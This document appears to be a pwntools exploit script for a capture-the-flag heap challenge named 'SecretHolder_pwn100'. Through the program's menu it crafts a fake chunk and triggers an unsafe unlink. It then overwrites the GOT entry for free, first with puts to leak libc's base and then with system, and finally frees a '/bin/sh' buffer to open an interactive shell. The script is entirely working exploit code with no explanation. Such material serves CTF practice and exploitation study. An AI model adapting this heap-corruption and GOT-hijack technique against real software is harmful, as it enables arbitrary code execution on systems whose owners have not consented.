from pwn import *
import StringIO

#context.log_level = 'debug'
#context.aslr = False

io = process('./SecretHolder_pwn100')

e = ELF('./SecretHolder_pwn100')
libc = e.libc

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
	addr1 = 0x00401866
	addr2 = 0x00401850
	payload = ''
	payload += p64(addr1) 
	payload += 'A' * 8       # add     rsp, 8
	payload += p64(0x0)      # rbx = 0
	payload += p64(0x1)      # rbp = 1
	payload += p64(func_ptr) # r12
	payload += p64(arg3)     # r13 = rdx = arg3
	payload += p64(arg2)     # r14 = rsi
	payload += p64(arg1)     # r15d = edi
	payload += p64(addr2)    # call *func_ptr
	payload += 'A'* 8 * 7    
	return payload

def answer(recv_buf, send_buf, newline= True):
	io.recvuntil(recv_buf)
	if newline:
		io.sendline(send_buf)
	else:
		io.send(send_buf)


def keep_sec(size, buf):
	answer('Renew secret', '1')
	answer('3. Huge secret', str(size))
	answer('secret:', buf)

def wipe_sec(size):
	answer('Renew secret', '2')
	answer('3. Huge secret', str(size))

def renew_sec(size, buf, newline= True):
	answer('Renew secret', '3')
	answer('3. Huge secret', str(size))
	answer('secret:', buf, newline)

keep_sec(3, 'A'*0x10)
wipe_sec(3)

keep_sec(1, '1111')
keep_sec(2, '2222')

wipe_sec(1)
wipe_sec(2)

ptr = 0x6020a8
#ptr = 0x6020a0

payload = p64(0) + p64(0x20)
payload += p64(ptr - 0x18) + p64(ptr - 0x10)

payload += p64(0x20) + p64(0x100)
payload += 'B'* 0xF0
payload += 'B'*0x8 + p64(0x101)
payload += 'B'* 0xF0
payload += 'B'*0x8 + p64(0x101)

keep_sec(3, payload)
keep_sec(1, 'aaaa')

#gdb.attach(io, 'b* 0x0400D4D')
wipe_sec(2)

payload = '/bin/sh\x00' + p64(0)
payload += p64(e.got['free']) + p64(0x602090)
payload += p64(e.got['puts']) + p64(1)
payload += p64(1) + p64(1)
renew_sec(3, payload)

renew_sec(2, p64(e.plt['puts']), False)
sleep(1)

wipe_sec(1)

io.recv()
buf = io.recv(6)
buf = buf.ljust(8,'\x00')
puts_addr = u64(buf)
log.success("puts:%#x"%puts_addr)

libc.address = puts_addr - libc.symbols['puts']

renew_sec(2, p64(libc.symbols['system']), False)
sleep(1)

wipe_sec(3)

io.interactive()
